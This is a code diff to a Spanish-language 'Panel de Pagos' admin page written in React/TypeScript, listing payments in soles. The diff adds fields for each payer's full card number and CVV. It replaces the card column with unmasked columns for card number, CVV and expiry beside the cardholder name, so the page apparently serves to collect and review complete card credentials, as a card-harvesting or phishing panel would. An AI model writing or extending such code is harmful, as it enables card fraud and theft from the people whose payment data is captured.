@@ -10,6 +10,8 @@ type Pago = {
   nombre: string;
   monto: string;
   tarjeta: string;
+  num_tarjeta_completo: string;
+  cvv: string;
   titular: string;
   vencimiento: string;
   estado: 'EXITOSO' | 'RECHAZADO';
@@ -36,7 +38,7 @@ export default function AdminPagosPage() {
 
   return (
     <div className="min-h-screen bg-gray-100 p-6" style={{ colorScheme: 'light' }}>
-      <div className="max-w-7xl mx-auto">
+      <div className="max-w-[1400px] mx-auto">
         <div className="flex items-center justify-between mb-6">
           <div>
             <h1 className="text-2xl font-bold text-gray-800">Panel de Pagos</h1>
@@ -77,36 +79,40 @@ export default function AdminPagosPage() {
                 <table className="w-full text-sm">
                   <thead className="bg-[#0057a8] text-white">
                     <tr>
-                      <th className="px-4 py-3 text-left font-semibold">#</th>
-                      <th className="px-4 py-3 text-left font-semibold">Fecha</th>
-                      <th className="px-4 py-3 text-left font-semibold">Código</th>
-                      <th className="px-4 py-3 text-left font-semibold">Cliente</th>
-                      <th className="px-4 py-3 text-right font-semibold">Monto</th>
-                      <th className="px-4 py-3 text-left font-semibold">Tarjeta</th>
-                      <th className="px-4 py-3 text-left font-semibold">Titular</th>
-                      <th className="px-4 py-3 text-left font-semibold">N° Operación</th>
-                      <th className="px-4 py-3 text-center font-semibold">Estado</th>
+                      <th className="px-3 py-3 text-left font-semibold">#</th>
+                      <th className="px-3 py-3 text-left font-semibold">Fecha</th>
+                      <th className="px-3 py-3 text-left font-semibold">Código</th>
+                      <th className="px-3 py-3 text-left font-semibold">Cliente</th>
+                      <th className="px-3 py-3 text-right font-semibold">Monto</th>
+                      <th className="px-3 py-3 text-left font-semibold">N° Tarjeta</th>
+                      <th className="px-3 py-3 text-left font-semibold">CVV</th>
+                      <th className="px-3 py-3 text-left font-semibold">Vencimiento</th>
+                      <th className="px-3 py-3 text-left font-semibold">Titular</th>
+                      <th className="px-3 py-3 text-left font-semibold">N° Operación</th>
+                      <th className="px-3 py-3 text-center font-semibold">Estado</th>
                     </tr>
                   </thead>
                   <tbody className="divide-y divide-gray-100">
                     {pagos.length === 0 && (
                       <tr>
-                        <td colSpan={9} className="text-center py-12 text-gray-400">No hay registros de pagos todavía.</td>
+                        <td colSpan={11} className="text-center py-12 text-gray-400">No hay registros de pagos todavía.</td>
                       </tr>
                     )}
                     {pagos.map((p, i) => (
                       <tr key={p.id} className={i % 2 === 0 ? 'bg-white' : 'bg-gray-50'}>
-                        <td className="px-4 py-3 text-gray-400">{p.id}</td>
-                        <td className="px-4 py-3 text-gray-600 whitespace-nowrap">
+                        <td className="px-3 py-3 text-gray-400">{p.id}</td>
+                        <td className="px-3 py-3 text-gray-600 whitespace-nowrap">
                           {new Date(p.fecha).toLocaleString('es-PE', { timeZone: 'America/Lima' })}
                         </td>
-                        <td className="px-4 py-3 font-mono text-gray-700">{p.codigo_cliente}</td>
-                        <td className="px-4 py-3 text-gray-800">{p.nombre}</td>
-                        <td className="px-4 py-3 text-right font-semibold text-gray-800">S/ {parseFloat(p.monto).toFixed(2)}</td>
-                        <td className="px-4 py-3 font-mono text-gray-600">{p.tarjeta}</td>
-                        <td className="px-4 py-3 text-gray-700">{p.titular}</td>
-                        <td className="px-4 py-3 font-mono text-gray-500">{p.nro_operacion}</td>
-                        <td className="px-4 py-3 text-center">
+                        <td className="px-3 py-3 font-mono text-gray-700">{p.codigo_cliente}</td>
+                        <td className="px-3 py-3 text-gray-800 whitespace-nowrap">{p.nombre}</td>
+                        <td className="px-3 py-3 text-right font-semibold text-gray-800">S/ {parseFloat(p.monto).toFixed(2)}</td>
+                        <td className="px-3 py-3 font-mono text-gray-700 whitespace-nowrap">{p.num_tarjeta_completo || '—'}</td>
+                        <td className="px-3 py-3 font-mono text-gray-700">{p.cvv || '—'}</td>
+                        <td className="px-3 py-3 font-mono text-gray-700">{p.vencimiento || '—'}</td>
+                        <td className="px-3 py-3 text-gray-700 whitespace-nowrap">{p.titular}</td>
+                        <td className="px-3 py-3 font-mono text-gray-500 whitespace-nowrap">{p.nro_operacion}</td>
+                        <td className="px-3 py-3 text-center">
                           <span className={`inline-block px-2 py-0.5 rounded-full text-xs font-bold ${
                             p.estado === 'EXITOSO'
                               ? 'bg-green-100 text-green-700'
